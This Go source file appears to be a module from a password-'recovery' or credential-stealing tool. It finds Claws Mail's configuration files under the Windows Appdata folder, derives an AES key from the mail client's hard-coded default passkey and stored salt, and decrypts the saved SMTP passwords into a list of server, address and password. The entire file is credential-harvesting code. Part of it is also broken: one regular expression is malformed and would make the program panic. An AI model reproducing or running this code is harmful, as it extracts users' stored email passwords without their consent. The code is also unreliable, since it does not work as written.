package recovery_passwords

import (
	"crypto/sha1"
	"encoding/base64"
	"io/ioutil"
	"log"
	"regexp"
	"strconv"
	"strings"

	"golang.org/x/crypto/pbkdf2"
)

func Recovery_passwords_claswmail_decode(plian string, key []byte) string {
	iv := make([]byte, 16)
	dncrypt_str, err := AESDncrypt(plian, key, iv)
	if err == nil {
		dncrypt_str = dncrypt_str[16:]
		dncrypt_str = strings.Replace(dncrypt_str, "\x00", "", -1)
		return dncrypt_str
	}
	return ""
}
func Recovery_passwords_claswmail() []Logins_table_struct {
	result := []Logins_table_struct{}
	file_path := Appdata + "\\Claws-mail"
	clawsrc_path := file_path + "\\clawsrc"
	exist_flag, _ := PathExists(file_path)
	exist_flag_clawsrc, _ := PathExists(clawsrc_path)
	if exist_flag == true && exist_flag_clawsrc == true {
		file_bytes, err := ioutil.ReadFile(clawsrc_path)
		if err == nil {
			input := string(file_bytes)
			bzm := "passkey0"
			value_list := Get_substr_by_regexp(input, `master_passphrase_salt=(.+)`) //value3
			if len(value_list) > 0 {
				value3 := value_list[0]
				value_list := Get_substr_by_regexp(input, `master_passphrase_pbkdf2_rounds=(.+)`)
				if len(value_list) > 0 {
					value := value_list[0]
					value_list := Get_substr_by_regexp(input, `use_master_passphrase=(.+)`)
					if len(value_list) > 0 {
						value2 := value_list[0]
						log.Println(value3, value, value2)
						floatvalue2, _ := strconv.ParseFloat(value2, 64)
						if floatvalue2 != 0 || len(value3) < 1 {
							return result
						}
						accountrc_path := file_path + "\\accountrc"
						exist_flag_accountrc, _ := PathExists(accountrc_path)
						if exist_flag_accountrc == true {
							file_bytes, err = ioutil.ReadFile(accountrc_path)
							if err == nil {
								input_accountrc := strings.Replace(string(file_bytes), "\n", "", -1)
								url_list := Get_substr_by_regexp(input_accountrc, `smtp_server=(.*?)nntp_server`)
								user_name_list := Get_substr_by_regexp(input_accountrc, `address=(.*?)organization`)
								if len(url_list) == 0 || len(user_name_list) == 0 {
									return result
								}
								passwordstorerc_path := file_path + "\\passwordstorerc"
								exist_flag_passwordstorerc, _ := PathExists(passwordstorerc_path)
								if exist_flag_passwordstorerc == true {
									file_bytes, err = ioutil.ReadFile(passwordstorerc_path)
									input_passwordstorerc := string(file_bytes)
									regexp_str := regexp.MustCompile(`(?s:}.*?\n`)
									if regexp_str != nil {
										password_plain_list := regexp_str.FindAllStringSubmatch(input_passwordstorerc, -1)
										if len(password_plain_list) > 0 {
											iterations, _ := strconv.ParseInt(value, 10, 32)
											master_passphrase_salt, _ := base64.StdEncoding.DecodeString(value3)
											key := pbkdf2.Key([]byte(bzm), master_passphrase_salt, int(iterations), 32, sha1.New)
											for i, _ := range password_plain_list {
												password_plain := password_plain_list[i][0][1:]
												password := Recovery_passwords_claswmail_decode(password_plain, key)
												result = append(result, Logins_table_struct{Origin_url: url_list[i], Username_value: user_name_list[i], Password_value: password})
											}
										}
									}
								}
							}
						}
					}
				}
			}

		} else {
			log.Println("error readfile", clawsrc_path, err)
		}
	} else {
		log.Println("error", file_path, "or", clawsrc_path, "not exist!")
	}
	return result
}

func Recovery_passwords_claswmails() map[string][]Logins_table_struct {
	result_map := make(map[string][]Logins_table_struct)
	result := Recovery_passwords_claswmail()
	if len(result) > 0 {
		result_map["Claws-mail"] = result
	}
	return result_map
}
